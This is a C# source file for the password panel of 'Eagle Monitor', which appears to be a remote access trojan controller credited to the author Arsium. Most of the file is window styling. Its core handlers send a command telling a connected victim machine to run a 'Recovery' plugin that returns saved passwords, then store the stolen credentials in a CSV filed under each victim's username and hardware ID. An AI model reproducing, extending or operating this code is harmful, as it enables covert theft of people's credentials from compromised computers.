using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class PasswordsForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }

        public PasswordsForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void PasswordsForm_Load(object sender, EventArgs e)
        {
            ControlsDrawing.Enable(passwordsListView);
            //Utilities.SetTheme(this);
            passwordsListView.ForeColor = Color.FromArgb(64, 64, 64);
            passwordsListView.BackColor = Color.White;
            ControlsDrawing.colorListViewHeader(ref passwordsListView, Color.White, Color.FromArgb(64, 64, 64), Color.FromArgb(230, 230, 230));
            passwordsListView.Scrollable = true;

            ControlsDrawing.Enable(passwordsContextMenuStrip);

            foreach (ToolStripMenuItem I in passwordsContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            passwordsContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void getPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            this.labelSize.Text = "0";
            this.passwordsListView.Items.Clear();
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Recovery;
            D.IP_Origin = this.IP_Origin;
            D.HWID = this.ClientHWID;
            D.DataReturn = new object[] { Shared.PacketType.PASSWORDS };
            Task.Run(() => Client.ClientDictionary[IP_Origin].SendData(D.Serialize()));
        }

        private void savePasswordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Utilities.ToCSV(this.passwordsListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Passwords\\Passwords.csv");
        }
    }
}
